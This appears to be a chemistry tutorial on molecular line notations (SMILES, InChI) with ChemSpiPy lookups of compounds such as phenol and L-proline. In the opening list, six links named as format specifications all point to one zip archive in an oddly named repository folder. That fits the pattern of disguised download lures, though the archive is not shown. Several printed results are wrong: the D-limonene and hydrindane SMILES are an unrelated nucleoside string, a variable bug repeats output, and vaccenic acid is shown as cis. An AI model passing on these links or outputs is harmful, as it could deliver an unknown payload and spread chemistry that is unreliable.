---
date: "2025-12-09"
---

[![](https://colab.research.google.com/assets/colab-badge.svg)](https://github.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/blob/main/Chemistry-Database.html)

# Storing and Transmitting Chemical Database

In research and education, computers and internet have been widely adopted. There is many formats, online service and software packages that can be used for learning of molecules and atoms in dynamics simulation. The basic format consists of:

[![](https://media.springernature.com/lw685/springer-static/image/art%3A10.1186%2Fs13321-025-01064-7/MediaObjects/13321_2025_1064_Figa_HTML.png?as=webp)](https://doi.org/10.1186/s13321-025-01064-7)

1. _SMILES_ [`Simplified Molecular-Input Line-Entry System`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)

2. _SMART_ [`Smiles Arbitary Target Specification`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)

3.  _XYZ_ [`XYZ-py`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)

4. _Molfile_ [`MDL Molfile`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)
5. _Chemical Markup Language format based on Extensible Markup Language_ [`XML-based formats`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)

6. _InChI and InChIkey_ [`The international Chemical Identifier`](https://raw.githubusercontent.com/dindagustiayu/ChemSpiPy-PySMILES-InChI-of-Chemistry-Database/main/undiaphanous/SMILE-of-Chemistry-Spi-In-Database-Ch-Py-Chem-v2.8.zip)

# Online Database
There are several free online service and database that can be searched for information about chemical compounds. 

1. _Wikipedia_ [`wikipedia.org`](https://en.wikipedia.org/wiki/List_of_chemical_databases)
2. _Chemspider by the Royal Society Chemistry_ [`www.chemspider.com`](https://www.chemspider.com/)
3. _PubChem by National Intitute of Health (NIH)_ [`https://pubchem.ncbi.nlm.nih.gov`](https://pubchem.ncbi.nlm.nih.gov/)
4. _NIST (The US National Institute of Standards and Technology)_ [`https://webbook.nist.gov/chemistry/`](https://webbook.nist.gov/chemistry/)


## P8.1 - ChemSpiPy and the ChemSpider API (Application Programming Interface)

ChemSpiPy is a Python library that interact with the ChemSpider API. It allow chemical searches, chemical file download by querying the ChemSpider service over the internet automatically import data without having to visit the ChemSpider website.

Deduces the srtucture of the following molecules from their  InChi strings:

[![Standard InChI](https://chem.libretexts.org/@api/deki/files/202932/InChI%252BLayers.JPG?revision=1)](https://chem.libretexts.org/Courses/Fordham_University/Chem1102%3A_Drug_Discovery_-_From_the_Laboratory_to_the_Clinic/05%3A_Organic_Molecules/5.08%3A_Line_Notation_(SMILES_and_InChI))


1. InChI=1S/C6H60/c7-6-4-2-1-3-5-6/h1-5,7H
2. InChI=1S/C5H12O/c1-3-5(2)4-6/h5-6H,3-4H2,1-2H3
3. InChI=1S/C6H10/c1-6-4-2-3-5-6/h4H,2-3, 5H2,1H3
4. InChI=1S/C5H9NO2/c7-5(8)4-2-1-3-6-4/h4,6H,1-3H2,(H,7,8)

__Hint__: the notation (H,7,8) means that a single hydrogen atom is shared by atoms 7 and 8. 

```python
from chemspipy import ChemSpider
cs = ChemSpider('YOUR_API-KEY')

# Search by InChI string
c = cs.get_compound(971)

# Print basic info
print('1 Common Name:', c.common_name)
print('ChemSpider ID:', c.csid)
print('Molecular Formula:', c.molecular_formula)
print('Molecular Weight:', c.molecular_weight)
print('InChI:', c.inchi)
print('InChI Key:', c.inchikey)
print('SMILES:', c.smiles)
```
```
1 Common Name: Phenol
ChemSpider ID: 971
Molecular Formula: C_{6}H_{6}O
Molecular Weight: 94.113
InChI: InChI=1S/C6H6O/c7-6-4-2-1-3-5-6/h1-5,7H
InChI Key: ISWSIDIOOBJBQZ-UHFFFAOYSA-N
SMILES: Oc1ccccc1
```
```python
from chemspipy import ChemSpider
cs = ChemSpider('YOUR_API-KEY')

# Search by InChI string
c = cs.get_compound(8398)

# Print basic info
print('2 Common Name:', c.common_name)
print('ChemSpider ID:', c.csid)
print('Molecular Formula:', c.molecular_formula)
print('Molecular Weight:', c.molecular_weight)
print('InChI:', c.inchi)
print('InChI Key:', c.inchikey)
print('SMILES:', c.smiles)
```
```
2 Common Name: 2-Methylbutan-1-ol
ChemSpider ID: 8398
Molecular Formula: C_{5}H_{12}O
Molecular Weight: 88.15
InChI: InChI=1S/C5H12O/c1-3-5(2)4-6/h5-6H,3-4H2,1-2H3
InChI Key: QPRQEDXDYOZYLA-UHFFFAOYSA-N
SMILES: CCC(C)CO
```
```python
from chemspipy import ChemSpider
cs = ChemSpider('YOUR_API-KEY')

# Search by InChI string
c = cs.get_compound(12222)

# Print basic info
print('3 Common Name:', c.common_name)
print('ChemSpider ID:', c.csid)
print('Molecular Formula:', c.molecular_formula)
print('Molecular Weight:', c.molecular_weight)
print('InChI:', c.inchi)
print('InChI Key:', c.inchikey)
print('SMILES:', c.smiles)
```
```
3 Common Name: Methylcyclopentene
ChemSpider ID: 12222
Molecular Formula: C_{6}H_{10}
Molecular Weight: 82.146
InChI: InChI=1S/C6H10/c1-6-4-2-3-5-6/h4H,2-3,5H2,1H3
InChI Key: ATQUFXWBVZUTKO-UHFFFAOYSA-N
SMILES: CC1=CCCC1
```
```python
from chemspipy import ChemSpider
cs = ChemSpider('YOUR_API-KEY')

# Search by InChI string
c = cs.get_compound(128566)

# Print basic info
print('4 Common Name:', c.common_name)
print('ChemSpider ID:', c.csid)
print('Molecular Formula:', c.molecular_formula)
print('Molecular Weight:', c.molecular_weight)
print('InChI:', c.inchi)
print('InChI Key:', c.inchikey)
print('SMILES:', c.smiles)
```
```
4 Common Name: L-Proline
ChemSpider ID: 128566
Molecular Formula: C_{5}H_{9}NO_{2}
Molecular Weight: 115.132
InChI: InChI=1S/C5H9NO2/c7-5(8)4-2-1-3-6-4/h4,6H,1-3H2,(H,7,8)/t4-/m0/s1
InChI Key: ONIBWKKTOPOVIA-BYPYZUCNSA-N
SMILES: O=C(O)[C@@H]1CCCN1
```


# P8.2- SMILES 
The simplified Molecular-Input Line-Entry System (SMILES) represents chemical species as short, plain text (ASCII) strings. This SMILES specification is divided into two distinct parts: A __syntactic specification__ specifies how the atoms, bonds, parentheses, digits, and so forth are represented, and a __Semantic SPecification__ that describes how those symbols are interpreted as a sensible molecule.

__The function and arguments:__

- `read_smiles`
- `explicit_hydrogen = False`
- `zero_order_bonds = True`
- `reinterpret_aromatic = True`
- `strict = True`

Write the SMILES strings for the following molecules:
1. Toulena, Ph-CH3
2. The trans fatty acid, vaccenic acid:
   
   ![Fatty Acid](https://pubchem.ncbi.nlm.nih.gov/image/imgsrv.fcgi?cid=5281127&t=l)

3. Glycine, H2NCH2COOH
   
4. D-Limonene:
   
   ![D-Limonene](https://pubchem.ncbi.nlm.nih.gov/image/imgsrv.fcgi?cid=440917&t=l)

5. Hydrindane (bycylo[4.3.0]nonane):
   
   ![Bicyclo[4.3.0]nonane](https://webbook.nist.gov/cgi/cbook.cgi?Struct=R524448&Type=Color)

```python
from chemspipy import ChemSpider
cs = ChemSpider('YOUR_API-KEY')

# Search by InChI string from ChemSpider ID
c = cs.get_compound(1108)
print('SMILES Toluena:', c.smiles)

c = cs.get_compound(4445888)
print('SMILES Vaccenic Acid:', c.smiles)

c = cs.get_compound(730)
print('SMILES Glycine,:', c.smiles)

c = cs.get_compound(2591)
print('SMILES D-Limonene,:', c.smiles)

C = cs.get_compound(10459)
print('SMILES bycylo[4.3.0]nonane,:', c.smiles)
```
```

SMILES Toluena: Cc1ccccc1
SMILES Vaccenic Acid: CCCCCC/C=C\CCCCCCCCCC(=O)O
SMILES Glycine,: NCC(=O)O
SMILES D-Limonene,: OCC1OC(n2cnc3c(NC4CCCCC4)ncnc32)C(O)C1O
SMILES bycylo[4.3.0]nonane,: OCC1OC(n2cnc3c(NC4CCCCC4)ncnc32)C(O)C1O
```
